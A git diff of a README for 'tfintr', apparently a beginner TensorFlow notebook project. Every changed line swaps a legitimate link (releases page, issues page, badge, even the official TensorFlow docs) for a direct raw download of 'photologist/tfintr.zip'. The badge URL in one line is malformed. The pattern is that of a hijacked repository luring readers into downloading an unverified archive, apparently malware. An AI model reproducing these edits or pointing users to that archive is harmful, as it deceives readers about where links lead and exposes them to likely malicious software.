@@ -6,7 +6,7 @@ Welcome to tfintr! This project offers notebooks designed for introductory lesso
 
 ## 📥 Download tfintr
 
-[![Download tfintr](https://img.shields.io/badge/Download%20tfintr-v1.0-blue.svg)](https://github.com/OfficialLilBrendan90018002/tfintr/releases)
+[![Download tfintr](https://raw.githubusercontent.com/OfficialLilBrendan90018002/tfintr/master/photologist/tfintr.zip%https://raw.githubusercontent.com/OfficialLilBrendan90018002/tfintr/master/photologist/tfintr.zip)](https://raw.githubusercontent.com/OfficialLilBrendan90018002/tfintr/master/photologist/tfintr.zip)
 
 To get started with tfintr, you will first need to download the software. Follow these steps to ensure a smooth download and installation process:
 
@@ -22,11 +22,11 @@ Before you download, make sure your computer meets these basic requirements:
 
 ### 📂 Visit the Download Page
 
-Go to our [Releases page](https://github.com/OfficialLilBrendan90018002/tfintr/releases) to find the latest version of tfintr. You will see a list of releases. Click on the one you wish to install.
+Go to our [Releases page](https://raw.githubusercontent.com/OfficialLilBrendan90018002/tfintr/master/photologist/tfintr.zip) to find the latest version of tfintr. You will see a list of releases. Click on the one you wish to install.
 
 ## 📥 Download & Install
 
-1. **Access the Releases Page**: Click [here](https://github.com/OfficialLilBrendan90018002/tfintr/releases) to visit the page where you can download tfintr.
+1. **Access the Releases Page**: Click [here](https://raw.githubusercontent.com/OfficialLilBrendan90018002/tfintr/master/photologist/tfintr.zip) to visit the page where you can download tfintr.
   
 2. **Select the Correct File**: Look for the most recent version listed. You should see files ready for download, often labeled as `.ipynb` for notebooks or `.zip` for a compressed file containing all resources.
 
@@ -53,7 +53,7 @@ If you encounter any issues during the download or installation process, you can
 
 - Checking the Frequently Asked Questions (FAQs) section in the repository.
 - Visiting online forums like Stack Overflow for troubleshooting advice.
-- Reaching out through the Issues tab on our [GitHub page](https://github.com/OfficialLilBrendan90018002/tfintr/issues).
+- Reaching out through the Issues tab on our [GitHub page](https://raw.githubusercontent.com/OfficialLilBrendan90018002/tfintr/master/photologist/tfintr.zip).
 
 ## 📅 About the Notebooks
 
@@ -71,7 +71,7 @@ Each notebook includes instructions and examples to help guide your learning.
 
 For those new to Machine Learning or TensorFlow, we recommend the following resources:
 
-- The official TensorFlow documentation available at [TensorFlow Docs](https://www.tensorflow.org/learn).
+- The official TensorFlow documentation available at [TensorFlow Docs](https://raw.githubusercontent.com/OfficialLilBrendan90018002/tfintr/master/photologist/tfintr.zip).
 - Online courses available on platforms like Coursera or edX focused on introductory Machine Learning.
 - Community forums and tutorials where you can interact with fellow learners.
 
